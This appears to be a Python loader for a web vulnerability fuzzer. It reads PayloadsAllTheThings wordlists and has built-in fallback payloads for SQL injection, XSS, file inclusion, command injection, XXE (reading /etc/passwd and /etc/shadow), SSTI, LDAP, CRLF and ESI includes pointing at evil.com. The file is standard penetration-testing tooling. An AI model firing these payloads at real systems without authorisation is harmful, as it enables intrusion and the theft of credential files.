"""
payloads.py — Runtime loader for PayloadsAllTheThings payload files.

Lazy-loads .txt files from external/PayloadsAllTheThings/ on first access and
caches results in-process. All functions return list[str] with empty lines
stripped. Falls back to a minimal inline list when PAT is not present so the
tool still works without the submodule.

Update PAT:
    git -C external/PayloadsAllTheThings pull
"""

from pathlib import Path

_PAT_ROOT = Path(__file__).parent.parent / "external" / "PayloadsAllTheThings"
_CACHE: dict[str, list[str]] = {}


def _load(*path_parts: str) -> list[str]:
    key = "/".join(path_parts)
    if key not in _CACHE:
        p = _PAT_ROOT.joinpath(*path_parts)
        if p.exists():
            _CACHE[key] = [l for l in p.read_text(errors="ignore").splitlines() if l.strip()]
        else:
            _CACHE[key] = []
    return _CACHE[key]


def _load_multi(*file_specs: tuple) -> list[str]:
    """Concatenate multiple PAT files deduplicated."""
    seen: set[str] = set()
    out: list[str] = []
    for spec in file_specs:
        for line in _load(*spec):
            if line not in seen:
                seen.add(line)
                out.append(line)
    return out


def available() -> bool:
    return _PAT_ROOT.exists()


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

def sql_error() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_ErrorBased.txt") or [
        "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        " OR 1=1", " HAVING 1=1", "' AND 1=2--",
    ]


def sql_time() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_TimeBased.txt") or [
        "' AND SLEEP(3)--", "\" AND SLEEP(3)--",
        "1; WAITFOR DELAY '0:0:3'--", "1 AND pg_sleep(3)--",
    ]


def sql_auth_bypass() -> list[str]:
    return _load_multi(
        ("SQL Injection", "Intruder", "Auth_Bypass.txt"),
        ("SQL Injection", "Intruder", "Auth_Bypass2.txt"),
    ) or ["' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 1=1#"]


def sql_union() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_UnionSelect.txt")


# ---------------------------------------------------------------------------
# XSS
# ---------------------------------------------------------------------------

def xss_quick() -> list[str]:
    return _load("XSS Injection", "Intruders", "xss_payloads_quick.txt") or [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "';alert(1)//",
    ]


def xss_full() -> list[str]:
    return _load("XSS Injection", "Intruders", "xss_alert.txt")


def xss_polyglots() -> list[str]:
    return _load("XSS Injection", "Intruders", "XSS_Polyglots.txt")


def xss_jhaddix() -> list[str]:
    return _load("XSS Injection", "Intruders", "JHADDIX_XSS.txt")


def xss_event_handlers() -> list[str]:
    return _load("XSS Injection", "Intruders", "0xcela_event_handlers.txt")


# ---------------------------------------------------------------------------
# LFI / Directory Traversal
# ---------------------------------------------------------------------------

def lfi_unix() -> list[str]:
    return _load("File Inclusion", "Intruders", "JHADDIX_LFI.txt") or [
        "../../../etc/passwd", "../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc//passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]


def lfi_windows() -> list[str]:
    return _load("File Inclusion", "Intruders", "Windows-files.txt") or [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:/boot.ini",
    ]


def lfi_linux() -> list[str]:
    return _load("File Inclusion", "Intruders", "Linux-files.txt")


def lfi_traversal() -> list[str]:
    return _load("Directory Traversal", "Intruder", "directory_traversal.txt") or [
        "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252Fetc%252Fpasswd",
    ]


def lfi_traversal_deep() -> list[str]:
    return _load("Directory Traversal", "Intruder", "deep_traversal.txt")


def lfi_dotdotpwn() -> list[str]:
    return _load("Directory Traversal", "Intruder", "dotdotpwn.txt")


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

def cmdi_exec() -> list[str]:
    return _load("Command Injection", "Intruder", "command_exec.txt") or [
        "; echo hxxpsin-$((1+1))",
        "| echo hxxpsin-$((1+1))",
        "$(echo hxxpsin-$((1+1)))",
        "`echo hxxpsin-$((1+1))`",
        "%0a echo hxxpsin-$((1+1))",
    ]


def cmdi_unix() -> list[str]:
    return _load("Command Injection", "Intruder", "command-execution-unix.txt") or [
        ";id;", "|id", "||id", "`id`", "$(id)",
    ]


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

def ssti_fuzz() -> list[str]:
    return _load("Server Side Template Injection", "Intruder", "ssti.fuzz") or [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>",
        "#{7*7}", "*{7*7}", "{7*7}", "${{7*7}}",
    ]


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------

def xxe_payloads() -> list[str]:
    return _load_multi(
        ("XXE Injection", "Intruders", "XXE_Fuzzing.txt"),
        ("XXE Injection", "Intruders", "xml-attacks.txt"),
    ) or [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    ]


# ---------------------------------------------------------------------------
# Open Redirect
# ---------------------------------------------------------------------------

def open_redirect() -> list[str]:
    return _load_multi(
        ("Open Redirect", "Intruder", "Open-Redirect-payloads.txt"),
        ("Open Redirect", "Intruder", "openredirects.txt"),
        ("Open Redirect", "Intruder", "open_redirect_wordlist.txt"),
    ) or [
        "//google.com", "//evil.com/%2f..", "https://evil.com",
        "javascript:alert(1)", "///google.com", "////google.com",
        "/\\evil.com", "%2f%2fevil.com",
    ]


# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------

def nosql_mongodb() -> list[str]:
    return _load("NoSQL Injection", "Intruder", "MongoDB.txt") or [
        "{ $ne: 1 }", "[$ne]=1", "{ $gt: '' }",
        "', $where: '1 == 1'", "|| 1==1",
    ]


def nosql_general() -> list[str]:
    return _load("NoSQL Injection", "Intruder", "NoSQL.txt") or [
        "true, $where: '1 == 1'", "{ $ne: 1 }",
        '{"$gt": ""}', "';sleep(5000);'",
    ]


# ---------------------------------------------------------------------------
# LDAP Injection
# ---------------------------------------------------------------------------

def ldap_fuzz() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_FUZZ.txt") or [
        "*", "*)(&", "*))%00", "*()|%26'", "admin*",
        "*(|(objectclass=*))", "x' or name()='username' or 'x'='y",
    ]


def ldap_fuzz_small() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_FUZZ_SMALL.txt")


def ldap_attrs() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_attributes.txt") or [
        "cn", "uid", "mail", "userPassword", "objectClass",
        "ou", "dc", "sn", "givenName", "memberOf",
    ]


# ---------------------------------------------------------------------------
# CRLF Injection
# ---------------------------------------------------------------------------

def crlf_payloads() -> list[str]:
    return _load("CRLF Injection", "Files", "crlfinjection.txt") or [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0aSet-Cookie:crlf=injection",
        "/%0d%0aSet-Cookie:crlf=injection",
        "%250aSet-Cookie:crlf=injection",
        "%u000aSet-Cookie:crlf=injection",
    ]


# ---------------------------------------------------------------------------
# SSI/ESI
# ---------------------------------------------------------------------------

def ssi_payloads() -> list[str]:
    return _load("Server Side Include Injection", "Files", "ssi_esi.txt") or [
        "<!--#exec cmd=\"id\" -->",
        "<!--#include virtual=\"/etc/passwd\" -->",
        "<esi:include src=\"http://evil.com/\"/>",
    ]


# ---------------------------------------------------------------------------
# Web Cache / Param Miner
# ---------------------------------------------------------------------------

def cache_headers() -> list[str]:
    return _load("Web Cache Deception", "Intruders", "param_miner_lowercase_headers.txt")


# ---------------------------------------------------------------------------
# Insecure Management Interface
# ---------------------------------------------------------------------------

def springboot_actuator() -> list[str]:
    return _load("Insecure Management Interface", "Intruder", "springboot_actuator.txt") or [
        "actuator", "actuator/health", "actuator/env",
        "actuator/heapdump", "actuator/shutdown", "actuator/mappings",
        "actuator/beans", "actuator/metrics", "actuator/loggers",
        "health", "env", "metrics", "heapdump", "shutdown",
    ]
